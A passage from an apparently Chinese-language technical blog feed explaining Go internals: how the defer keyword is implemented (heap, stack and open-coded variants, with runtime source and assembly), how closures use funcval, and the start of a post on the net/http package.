class="keyword">if</span> d._panic != <span class="literal">nil</span> &#123;</span><br><span class="line">        throw(<span class="string">&quot;deferproc: d.panic != nil after newdefer&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    d.link = gp._defer</span><br><span class="line">    gp._defer = d <span class="comment">// 新的 _defer 结构体被追加到 Goroutine 持有的 defer 链表头部</span></span><br><span class="line">    d.fn = fn</span><br><span class="line">    d.pc = callerpc</span><br><span class="line">    d.sp = sp</span><br><span class="line">    <span class="keyword">switch</span> siz &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="comment">// Do nothing.</span></span><br><span class="line">    <span class="keyword">case</span> sys.PtrSize:</span><br><span class="line">        *(*<span class="keyword">uintptr</span>)(deferArgs(d)) = *(*<span class="keyword">uintptr</span>)(unsafe.Pointer(argp))</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        memmove(deferArgs(d), unsafe.Pointer(argp), <span class="keyword">uintptr</span>(siz))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deferproc returns 0 normally.</span></span><br><span class="line">    <span class="comment">// a deferred func that stops a panic</span></span><br><span class="line">    <span class="comment">// makes the deferproc return 1.</span></span><br><span class="line">    <span class="comment">// the code the compiler generates always</span></span><br><span class="line">    <span class="comment">// checks the return value and jumps to the</span></span><br><span class="line">    <span class="comment">// end of the function if deferproc returns != 0.</span></span><br><span class="line">    return0()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L223">runtime.deferproc</a> 中的 <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L392">runtime.newdefer</a> 函数的作用是想尽办法获得一个 <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> 结构体，办法有三个：</p>
<ol>
<li>从调度器的延迟调用缓存池 <code>sched.deferpool</code> 中取出结构体并将该结构体追加到当前 Goroutine 的缓存池中；</li>
<li>从 Goroutine 的延迟调用缓存池 <code>pp.deferpool</code> 中取出结构体</li>
<li>通过 <a href="https://github.com/golang/go/blob/921ceadd2997f2c0267455e13f909df044234805/src/runtime/malloc.go#L891">runtime.mallocgc</a> 在堆上创建一个新的结构体</li>
</ol>
<p>无论使用哪种方式，只要获取到 <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> 结构体，它都会被追加到所在 Goroutine 的 _defer 链表的最前面。</p>
<h3 id="栈上分配"><a href="#栈上分配" class="headerlink" title="栈上分配"></a>栈上分配</h3><p>在默认情况下，我们可以看到 Go 语言中 <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> 结构体都会在堆上分配，如果我们能够将部分结构体分配到堆上就可以节约内存分配带来的额外开销。</p>
<p>Go 语言团队在 1.13 中对 defer 关键字进行了优化，<strong>当该关键字在函数体中最多执行一次时</strong>，编译期间的 <a href="https://github.com/golang/go/blob/4d5bb9c60905b162da8b767a8a133f6b4edcaa65/src/cmd/compile/internal/gc/ssa.go#L4324">cmd/compile/internal/gc.state.call</a> 会将结构体分配到栈上并调用 <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L276">runtime.deferprocStack</a>：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *state)</span> <span class="title">call</span><span class="params">(n *Node, k callKind)</span> *<span class="title">ssa</span>.<span class="title">Value</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">var</span> call *ssa.Value</span><br><span class="line">    <span class="keyword">if</span> k == callDeferStack &#123;</span><br><span class="line">        <span class="comment">// Make a defer struct d on the stack.</span></span><br><span class="line">        t := deferstruct(stksize)</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// Call runtime.deferprocStack with pointer to _defer record.</span></span><br><span class="line">        arg0 := s.constOffPtrSP(types.Types[TUINTPTR], Ctxt.FixedFrameSize())</span><br><span class="line">        s.store(types.Types[TUINTPTR], arg0, addr)</span><br><span class="line">        call = s.newValue1A(ssa.OpStaticCall, types.TypeMem, deferprocStack, s.mem())</span><br><span class="line">        <span class="keyword">if</span> stksize &lt; <span class="keyword">int64</span>(Widthptr) &#123;</span><br><span class="line">            <span class="comment">// We need room for both the call to deferprocStack and the call to</span></span><br><span class="line">            <span class="comment">// the deferred function.</span></span><br><span class="line">            stksize = <span class="keyword">int64</span>(Widthptr)</span><br><span class="line">        &#125;</span><br><span class="line">        call.AuxInt = stksize</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    s.vars[&amp;memVar] = call</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为在编译期间我们已经创建了 <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> 结构体，所以 <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L276">runtime.deferprocStack</a> 函数在运行期间我们只需要设置那些未在编译期初始化的字段并将栈上的结构体追加到函数的链表上：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deferprocStack</span><span class="params">(d *_defer)</span></span> &#123;</span><br><span class="line">    gp := getg()</span><br><span class="line">    <span class="keyword">if</span> gp.m.curg != gp &#123;</span><br><span class="line">        <span class="comment">// go code on the system stack can&#x27;t defer</span></span><br><span class="line">        throw(<span class="string">&quot;defer on system stack&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// siz and fn are already set.</span></span><br><span class="line">    <span class="comment">// The other fields are junk on entry to deferprocStack and</span></span><br><span class="line">    <span class="comment">// are initialized here.</span></span><br><span class="line">    d.started = <span class="literal">false</span></span><br><span class="line">    d.heap = <span class="literal">false</span></span><br><span class="line">    d.openDefer = <span class="literal">false</span></span><br><span class="line">    d.sp = getcallersp()</span><br><span class="line">    d.pc = getcallerpc()</span><br><span class="line">    d.framepc = <span class="number">0</span></span><br><span class="line">    d.varp = <span class="number">0</span></span><br><span class="line">    *(*<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;d._panic)) = <span class="number">0</span></span><br><span class="line">    *(*<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;d.fd)) = <span class="number">0</span></span><br><span class="line">    *(*<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;d.link)) = <span class="keyword">uintptr</span>(unsafe.Pointer(gp._defer))</span><br><span class="line">    *(*<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;gp._defer)) = <span class="keyword">uintptr</span>(unsafe.Pointer(d))</span><br><span class="line"></span><br><span class="line">    return0()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>除了分配位置的不同，栈上分配和堆上分配的<a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> 并没有本质的不同，而该方法可以适用于绝大多数的场景，与堆上分配 相比，该方法可以将 defer 关键字的额外开销降低 ~30%。</p>
<h3 id="开放编码"><a href="#开放编码" class="headerlink" title="开放编码"></a>开放编码</h3><p>Go 语言在 1.14 中通过开发编码（Open Coded）实现 defer 关键字，该设计使用代码内联优化 defer 关键字的额外开销并引入函数数据 <code>funcdata</code> 管理 panic 的调用，该优化可以将 defer 的调用开销从 1.13 版本的 ~35ns 降低至 ~6ns 左右。</p>
<h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p>开放编码作为一种优化 defer 关键字的方法，它不是在所有的场景下都会开启的，开发编码只会在满足以下的条件时启用：</p>
<ul>
<li>函数的 defer 数量少于或者等于 8 个；</li>
<li>函数的 defer 关键字不能在循环中执行；</li>
<li>函数的 return 语句与 defer 语句的乘积小于或者等于 15 个；</li>
</ul>
<p>Go 语言会在编译期间根据代码是否满足上述条件确定是否使用开放编码。一旦确定使用开放编码，就会在编译期间初始化延迟比特和延迟记录。</p>
<h4 id="延迟记录"><a href="#延迟记录" class="headerlink" title="延迟记录"></a>延迟记录</h4><p><strong>延迟比特</strong>和<strong>延迟记录</strong>是使用开放编码实现 defer 的两个最重要结构，一旦决定使用开放编码，编译器会在编译期间在栈上初始化大小为 8 个比特的 <code>deferBits</code> 变量。</p>
<p>延迟比特中的每一个比特位都表示该位对应的 defer 关键字是否需要被执行，如下图所示，其中 8 个比特的倒数第二个比特在函数返回前被设置成了 1，那么该比特位对应的函数会在函数返回前执行：</p>
<p><img src="https://i.loli.net/2020/12/16/ehniw6W1Fts9uP8.png" alt="image.png"></p>
<p>延迟比特的作用就是标记哪些 defer 关键字在函数中被执行，这样在函数返回时可以根据对应 deferBits 的内容确定执行的函数，而正是因为 deferBits 的大小仅为 8 比特，所以该优化的启用条件为函数中的 defer 关键字少于 8 个。</p>
<p>传入 defer 关键字的函数和参数都会存储在延迟记录 <a href="https://draveness.me/golang/tree/cmd/compile/internal/gc.openDeferInfo">cmd/compile/internal/gc.openDeferInfo</a> 中：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> openDeferInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">    n           *Node</span><br><span class="line">    closure     *ssa.Value      <span class="comment">// 延迟调用函数</span></span><br><span class="line">    closureNode *Node</span><br><span class="line">    rcvr        *ssa.Value      <span class="comment">// 延迟方法的接收者</span></span><br><span class="line">    rcvrNode    *Node</span><br><span class="line">    argVals     []*ssa.Value    <span class="comment">// 延迟函数的参数</span></span><br><span class="line">    argNodes    []*Node</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开放编码开启后，使用 defer 关键字就和普通的函数调用相差无几了。例如对于下面 Defer.go 文件中的代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">c</span><span class="params">()</span> <span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">         i++</span><br><span class="line">     &#125;()</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 <code>go tool compile -S main.go</code> 得到汇编代码.可能很多人刚看到 go 汇编代码时会一脸懵，因为它既不是 AT&amp;T 格式，也不是 Intel 格式，而是较为小众的 Plan 9，<a href="https://xargin.com/plan9-assembly/">这篇文章</a>可以让你快速了解 Plan 9：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.c STEXT size=141 args=0x8 locals=0x28</span><br><span class="line">        0x0000 00000 (Defer.go:3)       TEXT    &quot;&quot;.c(SB), ABIInternal, $40-8</span><br><span class="line">        0x0000 00000 (Defer.go:3)       MOVQ    (TLS), CX</span><br><span class="line">        0x0009 00009 (Defer.go:3)       CMPQ    SP, 16(CX)</span><br><span class="line">        0x000d 00013 (Defer.go:3)       PCDATA  $0, $-2</span><br><span class="line">        0x000d 00013 (Defer.go:3)       JLS     131</span><br><span class="line">        0x000f 00015 (Defer.go:3)       PCDATA  $0, $-1</span><br><span class="line">        0x000f 00015 (Defer.go:3)       SUBQ    $40, SP</span><br><span class="line">        0x0013 00019 (Defer.go:3)       MOVQ    BP, 32(SP)</span><br><span class="line">        0x0018 00024 (Defer.go:3)       LEAQ    32(SP), BP</span><br><span class="line">        0x001d 00029 (Defer.go:3)       XORPS   X0, X0</span><br><span class="line">        0x0020 00032 (Defer.go:3)       MOVUPS  X0, 16(SP)</span><br><span class="line">        0x0025 00037 (Defer.go:3)       FUNCDATA        $0, gclocals·69c1753bd5f81501d95132d08af04464(SB)</span><br><span class="line">        0x0025 00037 (Defer.go:3)       FUNCDATA        $1, gclocals·e226d4ae4a7cad8835311c6a4683c14f(SB)</span><br><span class="line">        0x0025 00037 (Defer.go:3)       FUNCDATA        $5, &quot;&quot;.c.opendefer(SB)</span><br><span class="line">        0x0025 00037 (Defer.go:3)       MOVB    $0, &quot;&quot;..autotmp_2+15(SP)</span><br><span class="line">        0x002a 00042 (Defer.go:3)       MOVQ    $0, &quot;&quot;.i+48(SP)</span><br><span class="line">        0x0033 00051 (Defer.go:4)       LEAQ    &quot;&quot;.c.func1·f(SB), AX</span><br><span class="line">        0x003a 00058 (Defer.go:4)       MOVQ    AX, &quot;&quot;..autotmp_3+24(SP)</span><br><span class="line">        0x003f 00063 (Defer.go:4)       LEAQ    &quot;&quot;.i+48(SP), AX</span><br><span class="line">        0x0044 00068 (Defer.go:4)       MOVQ    AX, &quot;&quot;..autotmp_4+16(SP)</span><br><span class="line">        0x0049 00073 (Defer.go:4)       MOVB    $1, &quot;&quot;..autotmp_2+15(SP)</span><br><span class="line">        0x004e 00078 (Defer.go:7)       MOVQ    $1, &quot;&quot;.i+48(SP)</span><br><span class="line">        0x0057 00087 (Defer.go:7)       MOVB    $0, &quot;&quot;..autotmp_2+15(SP)</span><br><span class="line">        0x005c 00092 (Defer.go:7)       MOVQ    &quot;&quot;..autotmp_4+16(SP), AX</span><br><span class="line">        0x0061 00097 (Defer.go:7)       MOVQ    AX, (SP)</span><br><span class="line">        0x0065 00101 (Defer.go:7)       PCDATA  $1, $1</span><br><span class="line">        0x0065 00101 (Defer.go:7)       CALL    &quot;&quot;.c.func1(SB)</span><br><span class="line">        0x006a 00106 (Defer.go:7)       MOVQ    32(SP), BP</span><br><span class="line">        0x006f 00111 (Defer.go:7)       ADDQ    $40, SP</span><br><span class="line">        0x0073 00115 (Defer.go:7)       RET</span><br><span class="line">        0x0074 00116 (Defer.go:7)       CALL    runtime.deferreturn(SB)</span><br><span class="line">        0x0079 00121 (Defer.go:7)       MOVQ    32(SP), BP</span><br><span class="line">        0x007e 00126 (Defer.go:7)       ADDQ    $40, SP</span><br><span class="line">        0x0082 00130 (Defer.go:7)       RET</span><br><span class="line">        0x0083 00131 (Defer.go:7)       NOP</span><br><span class="line">        0x0083 00131 (Defer.go:3)       PCDATA  $1, $-1</span><br><span class="line">        0x0083 00131 (Defer.go:3)       PCDATA  $0, $-2</span><br><span class="line">        0x0083 00131 (Defer.go:3)       CALL    runtime.morestack_noctxt(SB)</span><br><span class="line">        0x0088 00136 (Defer.go:3)       PCDATA  $0, $-1</span><br><span class="line">        0x0088 00136 (Defer.go:3)       JMP     0</span><br><span class="line"></span><br><span class="line">&quot;&quot;.c.func1 STEXT nosplit size=9 args=0x8 locals=0x0</span><br><span class="line">        0x0000 00000 (Defer.go:4)       TEXT    &quot;&quot;.c.func1(SB), NOSPLIT|ABIInternal, $0-8</span><br><span class="line">        0x0000 00000 (Defer.go:4)       FUNCDATA        $0, gclocals·1a65e721a2ccc325b382662e7ffee780(SB)</span><br><span class="line">        0x0000 00000 (Defer.go:4)       FUNCDATA        $1, gclocals·69c1753bd5f81501d95132d08af04464(SB)</span><br><span class="line">        0x0000 00000 (Defer.go:5)       MOVQ    &quot;&quot;.&amp;i+8(SP), AX</span><br><span class="line">        0x0005 00005 (Defer.go:5)       INCQ    (AX)</span><br><span class="line">        0x0008 00008 (Defer.go:6)       RET</span><br></pre></td></tr></table></figure>

<p><code>FUNCDATA</code> 和 <code>PCDATA</code> 都是编译器为运行时垃圾回收额外添加的内容。从汇编代码第 28 行可以看到，启用开放编码以后执行延迟函数就跟普通的函数调用一样，都是通过 <code>CALL</code> 指令完成。</p>
<h3 id="执行延迟调用"><a href="#执行延迟调用" class="headerlink" title="执行延迟调用"></a>执行延迟调用</h3><p>编译器不仅将 defer 关键字都转换成 <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L223">runtime.deferproc</a> 、<a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L276">runtime.deferprocStack</a> 或者内联函数，还会在所有调用 defer 的函数末尾插入 <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L524">runtime.deferreturn</a> 的函数调用：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deferreturn</span><span class="params">(arg0 <span class="keyword">uintptr</span>)</span></span> &#123;</span><br><span class="line">    gp := getg()</span><br><span class="line">    d := gp._defer</span><br><span class="line">    <span class="keyword">if</span> d == <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125; <span class="comment">//  当前 Goroutine 持有的所有延迟函数都得到执行了，函数返回</span></span><br><span class="line">    sp := getcallersp()</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">switch</span> d.siz &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="comment">// Do nothing.</span></span><br><span class="line">    <span class="keyword">case</span> sys.PtrSize:</span><br><span class="line">        *(*<span class="keyword">uintptr</span>)(unsafe.Pointer(&amp;arg0)) = *(*<span class="keyword">uintptr</span>)(deferArgs(d))</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        memmove(unsafe.Pointer(&amp;arg0), deferArgs(d), <span class="keyword">uintptr</span>(d.siz))</span><br><span class="line">    &#125;</span><br><span class="line">    fn := d.fn</span><br><span class="line">    d.fn = <span class="literal">nil</span></span><br><span class="line">    gp._defer = d.link</span><br><span class="line">    freedefer(d)</span><br><span class="line">    _  = fn.fn</span><br><span class="line">    jmpdefer(fn, <span class="keyword">uintptr</span>(unsafe.Pointer(&amp;arg0)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://draveness.me/golang/tree/runtime.jmpdefer">runtime.jmpdefer</a> 是一个用汇编语言实现的运行时函数，它的主要工作是跳转到 defer 所在的代码段并在执行结束之后跳转回 <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L524">runtime.deferreturn</a>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TEXT runtime·jmpdefer(SB), NOSPLIT, $0-8</span><br><span class="line">    MOVL    fv+0(FP), DX    // fn</span><br><span class="line">    MOVL    argp+4(FP), BX  // caller sp</span><br><span class="line">    LEAL    -4(BX), SP      // caller sp after CALL</span><br><span class="line">    #ifdef GOBUILDMODE_shared</span><br><span class="line">    SUBL    $16, (SP)       // return to CALL again</span><br><span class="line">    #else</span><br><span class="line">    SUBL    $5, (SP)        // return to CALL again</span><br><span class="line">    #endif</span><br><span class="line">    MOVL    0(DX), BX</span><br><span class="line">    JMP BX                  // but first run the deferred function</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L524">runtime.deferreturn</a> 函数会多次判断当前 Goroutine 的 _defer 链表中是否有未执行的结构体，<strong>该函数只有在所有延迟函数都执行后才会返回</strong>。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>defer</code> 的实现主要依靠编译器和运行时的协作，经历了好几个版本的更迭，其可用性也越来越强。截止目前（2020年12月16日）经历了三种机制：</p>
<ol>
<li><p>堆上分配(1.1 ~ 现在)：</p>
<ul>
<li>编译期将 defer 关键字被转换为 <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L223">runtime.deferproc</a> 并在调用 defer 关键字的函数返回之前插入 <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L524">runtime.deferreturn</a></li>
<li>运行时调用 <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L22">runtime.deferproc</a> 会将一个新的 <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> 结构体追加到当前 Goroutine 的链表头；</li>
<li>运行时调用 <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L524">runtime.deferreturn</a> 会从 Goroutine 的链表中取出 <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> 结构并依次执行；</li>
</ul>
</li>
<li><p>栈上分配(1.13 ~ 现在):</p>
<ul>
<li>当该关键字在函数体中最多执行一次时，编译期间的 <a href="https://github.com/golang/go/blob/4d5bb9c60905b162da8b767a8a133f6b4edcaa65/src/cmd/compile/internal/gc/ssa.go#L4324">cmd/compile/internal/gc.state.call</a> 会将 <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> 结构体分配到栈上并调用 <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L276">runtime.deferprocStack</a></li>
</ul>
</li>
<li><p>开放编码(1.14 ~ 现在):</p>
<ul>
<li>编译期间判断 defer 关键字、return 语句的个数确定是否开启开放编码优化</li>
<li>通过 deferBits 和 <a href="https://draveness.me/golang/tree/cmd/compile/internal/gc.openDeferInfo">cmd/compile/internal/gc.openDeferInfo</a> 存储 defer 关键字的相关信息；</li>
<li>如果 defer 关键字的执行可以在编译期间确定，会在函数返回前直接跳转到相应的代码，否则会由运行时的  <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L524">runtime.deferreturn</a> 处理</li>
</ul>
</li>
</ol>
<p>于是前面提过的两个现象就可以解释了：</p>
<ul>
<li>后调用的 defer 函数会先执行：后调用的 defer 函数会被追加到 Goroutine 的 <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> 链表的最前面，而运行时是从链表的前到后依次执行</li>
<li>函数的参数会被预先计算：调用 <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L22">runtime.deferproc</a> 函数创建新的延迟调用时就会立刻拷贝函数的参数，函数的参数不会等到真正执行时计算；</li>
</ul>
<p>所有使用了 defer 关键字的函数最后都会插入  <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L524">runtime.deferreturn</a> 保证延迟函数得到执行。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://draveness.me/golang/docs/part2-foundation/ch05-keyword/golang-defer/#53-defer">Go语言设计与实现</a></p>
<p><a href="https://blog.golang.org/defer-panic-and-recover">Defer, Panic and Recover</a></p>
<p><a href="https://leokongwq.github.io/2016/10/15/golang-defer.html">golang之defer简介</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/56557423">Golang之轻松化解defer的温柔陷阱</a></p>
<p><a href="https://www.bilibili.com/video/BV1E5411x7NC">eggo: defer1.12</a></p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>Go底层大冒险之闭包</title>
    <url>/2020/06/21/go%E5%BA%95%E5%B1%82%E5%A4%A7%E5%86%92%E9%99%A9%E4%B9%8B%E9%97%AD%E5%8C%85/</url>
    <content><![CDATA[<p>Go 语言中函数是所谓“头等对象”，即可以通过参数传递，可以做函数返回值，也可以做为右值赋值给一个变量。Go 语言把这样的参数、返回值、变量称为 <code>function value</code>，本质上是一个指针，指向一个 <code>runtime.funcval</code> 结构体，这个结构体保存了函数的入口地址。</p>
<p><img src="https://i.loli.net/2020/06/21/FJnO7hbSEKM86jR.png" alt="FunctionValue"></p>
<p>举个例子：<code>func A</code> 的指令位于代码段的 addr1。由于 <code>func A</code> 对应的 <code>funcval</code> 没有捕获列表，编译期间编译器会在只读数据段分配一个 <code>funcval</code> 结构体，这个结构体本身的地址是 addr2 ，它保存了 <code>func A</code> 的地址 addr1，多次 <code>func A</code> 调用共享一个 <code>funcval</code>。执行阶段，addr2 会被赋予 f1 与 f2。执行 f1 就是通过 f1 找出对应的 <code>funcval</code>，进而拿到 <code>func A</code> 入口地址。</p>
<p><img src="https://i.loli.net/2020/06/21/4Dmf2zuxHWtgwCJ.png" alt="FunctionValue举例"></p>
<h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>既然有了函数入口地址就能间接调用函数，为什么要在中间插入一层 <code>funcval</code> 呢？这就是出于<strong>闭包</strong>的考虑了：</p>
<p><img src="https://i.loli.net/2020/06/21/NsIxdGY69SLgzub.png" alt="闭包"></p>
<p>在一些语言中(如C++)，返回局部变量的地址或引用被认为是不明智的，因为局部变量都分配在栈里，当函数执行结束其占用的栈空间也随之释放，此时我们返回的局部变量也被释放掉了。如果我们使用这些被释放掉的变量就会产生所谓“变量逃逸”问题。</p>
<p>所幸 JavaScript、Go 等语言都是支持闭包的。那么 Go 底层是如何实现闭包的呢？</p>
<p>举个例子：运行时在堆分配两个 <code>funcval</code> 结构体地址分别为 addr2、addr3。每个 <code>funcval</code> 同时又保存了各自的捕获列表。通过捕获列表就能使用保存下来的对象了。</p>
<p><img src="https://i.loli.net/2020/06/21/jU3g9E4tn5dSWh8.png" alt="Go闭包"></p>
<p>通常来讲，局部变量都是分配在栈的，上图也是这样。但是，如果捕获变量的值会发生改变，Go 编译器会在堆上分配局部变量，栈上只保存一个地址。这就是所谓的“局部变量堆分配”。<code>funcval</code> 的捕获列表保存局部变量的地址，这样闭包函数和外层函数就指向同一个变量了。</p>
<p><img src="https://i.loli.net/2020/06/21/NuOHmoygfK3scbL.png" alt="Go引用捕获变量"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>Go 内部会把所有 <code>function value</code> 转化为 <code>funcval</code> 结构体，这个结构体保存了函数的实际地址。</li>
<li>得益于 <code>funcval</code> 做为中间载体，Go 实现了闭包。<code>funcval</code> 会有一个捕获列表，里面或是保存了捕获变量的拷贝，或是保存了捕获变量的地址。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>B 站这个 up 讲得蛮好，通俗易懂，直接明了: <a href="https://www.bilibili.com/video/BV1ma4y1e7R5">eggo-tech</a></p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>初探http包——go网络服务的第一步</title>
    <url>/2020/06/03/http%E5%8C%85%E2%80%94%E2%80%94go%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AD%A5/</url>
    <content><![CDATA[<p>仅需几行 go 代码就可以构建一个高效的 HTTP 服务器:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">       w.Write([]<span class="keyword">byte</span>(<span class="string">&quot;hello world!&quot;</span>))</span><br><span class="line">    &#125;)</span><br><span class="line">    http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后访问 <code>127.0.0.1:8080</code> 就可以看到，一个服务器已经成功启动了（而且和 Python 等语言自带的服务器相比性能很强哦）：</p>
<p><img src="https://i.loli.net/2020/06/03/k3QcvMgNR1mr59A.png" alt="http服务器"></p>
<p>对一次 HTTP 通信，我们只需要关注客户端（client）和服务端（Server）即可。而一个 HTTP 服务器最重要的功能莫过于 <code>路由</code>，即实现一个多路选择器（multiplexer）。本文就来探索这背后的秘密。</p>
<p>先认识一下 Server 类：</p>
<p><img src="https://i.loli.net/2020/06/03/asTBZgulqdQXwco.png" alt="http.Server"></p>
<h2 id="从-Handler-说起"><a href="#从-Handler-说起" class="headerlink" title="从 Handler 说起"></a>从 Handler 说起</h2><p>Handler 是一个抽象接口，其唯一的方法是 <code>ServeHTTP(ResponseWriter, *Request)</code>。<br>实现了 Handler 接口的对象可以注册到 Server，为特定的路径及其子树提供服务。</p>
<p>下面是 http 包中实现了 Handler 的类：</p>
<p><img src="https://i.loli.net/2020/06/03/v63t1eTHROSb9dM.png" alt="Handler接口"></p>
<p>因为本包多处使用到名为 handler 的 Handler 实例，而这些实例可能拥有不同的实现，所以有必要做一个分类：</p>
<ul>
<li>handler 处理器函数：签名为 <code>func(ResponseWriter, *Request)</code> 的函数</li>
<li>handler 处理器：经过 <code>HandleFunc</code> 包装，实现了 <code>Handler</code> 接口的函数</li>
<li>handler 对象：任何实现了 <code>Handler</code> 接口的结构体</li>
</ul>
<p><img src="https://i.loli.net/2020/06/04/Y9glIrx8Ud5yfou.png" alt="Handler对象之间的关系"></p>
